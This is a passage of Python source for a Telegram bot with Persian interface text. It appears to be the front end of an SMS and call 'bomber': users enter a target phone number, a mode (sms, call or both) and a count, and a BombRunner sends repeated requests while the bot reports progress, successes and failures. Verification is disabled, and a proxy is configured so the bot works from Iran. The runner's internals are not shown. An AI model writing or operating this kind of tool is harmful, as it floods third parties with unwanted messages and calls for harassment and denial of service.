        await m.answer("❌ خطا. /start")
        await state.clear()
        return

    if is_forbidden(phone):
        await database.log_blocked(m.from_user.id)
        await m.answer("🚫 شماره مسدود.",
                       reply_markup=kb_main_menu(m.from_user.id in ADMIN_IDS))
        await state.clear()
        await state.set_state(S.menu)
        return

    uid = m.from_user.id
    mode_fa = {"sms": "📩", "call": "📞", "both": "🔥"}[mode]
    LAST_JOB[uid] = time.time()
    jid = await database.create_job(uid, phone, mode, count)

    status_msg = await m.answer(
        f"🚀 <b>شروع جاب</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎯 <code>{phone}</code>\n"
        f"🎛 {mode_fa} {mode}\n"
        f"🔁 {count}\n"
        f"🆔 #{jid[-8:]}\n\n"
        f"⏳ در حال اجرا...",
        reply_markup=kb_stop(jid),
    )

    last_edit = {"t": 0.0}

    async def on_progress(rounds, total, succ, fail):
        now = time.time()
        if now - last_edit["t"] < 2.0 and rounds != total:
            return
        last_edit["t"] = now
        pct = int((rounds / total) * 100) if total else 0
        bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
        try:
            await status_msg.edit_text(
                f"🚀 <b>در حال اجرا</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🎯 <code>{phone}</code>\n"
                f"🆔 #{jid[-8:]}\n\n"
                f"<code>{bar}</code> {pct}%\n"
                f"🔁 <b>{rounds}/{total}</b>\n"
                f"✅ {succ} | ❌ {fail}",
                reply_markup=kb_stop(jid),
            )
        except TelegramBadRequest:
            pass
        except Exception:
            pass

    runner = BombRunner(phone, count, mode, jid, on_progress=on_progress)
    ACTIVE[uid] = runner

    try:
        await m.bot.send_chat_action(m.chat.id, ChatAction.TYPING)
        result = await runner.run()
    except Exception as e:
        log.exception(f"Runner: {e}")
        result = {"rounds": runner.rounds, "success": runner.success,
                  "failed": runner.failed, "stopped": True}
    finally:
        ACTIVE.pop(uid, None)

    await database.finish_job(jid, result["success"], result["failed"],
                              result["rounds"],
                              "stopped" if result["stopped"] else "done")

    icon = "🛑" if result["stopped"] else "✅"
    txt = "متوقف" if result["stopped"] else "کامل"
    try:
        await status_msg.edit_text(
            f"{icon} <b>{txt}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 <code>{phone}</code>\n"
            f"🆔 #{jid[-8:]}\n\n"
            f"🔁 {result['rounds']}/{count}\n"
            f"✅ {result['success']} | ❌ {result['failed']}"
        )
    except Exception:
        pass

    await m.answer(
        "🏠 منوی اصلی:",
        reply_markup=kb_main_menu(uid in ADMIN_IDS),
    )
    await state.clear()
    await state.set_state(S.menu)


# ============================================================
#                    FALLBACK
# ============================================================
@router.message(S.menu)
async def fallback_menu(m: Message, state: FSMContext):
    if m.text and m.text.startswith("/"):
        return
    await m.answer(
        "❓ لطفاً از دکمه‌های منو استفاده کن.",
        reply_markup=kb_main_menu(m.from_user.id in ADMIN_IDS),
    )


# ============================================================
#                    🚀 MAIN
# ============================================================
async def set_commands(bot: Bot):
    try:
        await bot.set_my_commands([
            BotCommand(command="start", description="شروع"),
            BotCommand(command="help", description="راهنما"),
            BotCommand(command="myid", description="آیدی من"),
            BotCommand(command="cancel", description="لغو"),
        ], scope=BotCommandScopeDefault())
        log.info("✅ Commands set")
    except Exception as e:
        log.warning(f"⚠️ Commands: {e}")


async def main_async():
    banner()

    if not BOT_TOKEN or ":" not in BOT_TOKEN:
        log.critical("❌ BOT_TOKEN تنظیم نشده!")
        sys.exit(1)

    log.info(f"🤖 Bot name: {C.BCYAN}{C.BOLD}{BOT_NAME}{C.RESET}")
    log.info(f"⚙️ Proxy: {C.BBLUE}{PROXY_URL or 'None'}{C.RESET}")
    log.info(f"👑 Admins: {C.BYELLOW}{ADMIN_IDS}{C.RESET}")
    log.info(f"🚫 Filter: {len(_FORBIDDEN)} hash(es)")
    log.info(f"📱 Phone verification: {C.BRED}DISABLED{C.RESET}")
    log.info(f"📜 Rules on start: {C.BGREEN}ENABLED{C.RESET}")
    log.info(f"⌨️ Reply Keyboard Menu: {C.BGREEN}ENABLED{C.RESET}")

    if PROXY_URL:
        session = AiohttpSession(proxy=PROXY_URL)
        log.info(f"🔒 Using proxy: {C.BBLUE}{PROXY_URL}{C.RESET}")
    else:
        session = AiohttpSession()
        log.warning("⚠️ بدون پروکسی — از ایران کار نمی‌کند!")

    bot = Bot(
        token=BOT_TOKEN,
        session=session,
        default=DefaultBotProperties(parse_mode=ParseMode.HTML),
    )

    log.info("🔍 تست اتصال...")
    try:
        me = await bot.get_me()
        log.info(f"✅ Connected: {C.BGREEN}@{me.username}{C.RESET} | ID: {me.id}")
        database.config["bot_username"] = me.username
    except Exception as e:
        log.critical(f"❌ اتصال ناموفق: {type(e).__name__}: {e}")
        log.critical("")
        log.critical("🔧 راه‌حل:")
        log.critical("1. VPN یا پروکسی روشن کن")
        log.critical("2. PROXY_URL ست کن")
        log.critical("3. توکن را از @BotFather چک کن")
        await bot.session.close()
        sys.exit(1)

    storage = MemoryStorage()
    dp = Dispatcher(storage=storage)
    dp.include_router(router)

    await set_commands(bot)

    log.info("═" * 60)
    log.info(f"🌵 {C.BCYAN}{C.BOLD}B2 v6.0 is RUNNING{C.RESET}")
    log.info("═" * 60)

    try:
        await bot.delete_webhook(drop_pending_updates=True)
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    except (KeyboardInterrupt, SystemExit):
        log.info("🛑 Stopping...")
    finally:
        try:
            await bot.session.close()
        except Exception:
            pass
        log.info("✅ Cleanup done")


def main():
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        log.info("🛑 Interrupted by user")
    except Exception as e:
        log.critical(f"💀 Fatal: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
